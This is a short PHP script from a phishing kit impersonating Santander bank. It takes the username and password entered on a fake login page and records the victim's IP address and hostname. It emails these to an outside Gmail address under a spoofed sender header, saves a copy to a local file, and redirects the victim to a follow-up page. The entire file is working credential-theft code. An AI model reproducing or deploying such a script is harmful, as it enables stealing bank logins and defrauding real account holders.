<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________Santander_____________\n";
$message .= "\n";
$message .= "User            : ".$_POST['user']."\n";
$message .= "Password             : ".$_POST['pass']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| Yawyaw  |__________\n";
$send = "bader.elw@gmail.com ";
$subject = "Santander Log |".$_POST['user']."| $ip ";
$headers = "From:Login Santander <webmaster@cajamar.es>";
mail($send,$subject,$message,$headers);
$fp = fopen('santa.txt', 'a');
fwrite($fp, $message);
fclose($fp);
header("Location: firma.htm");

?>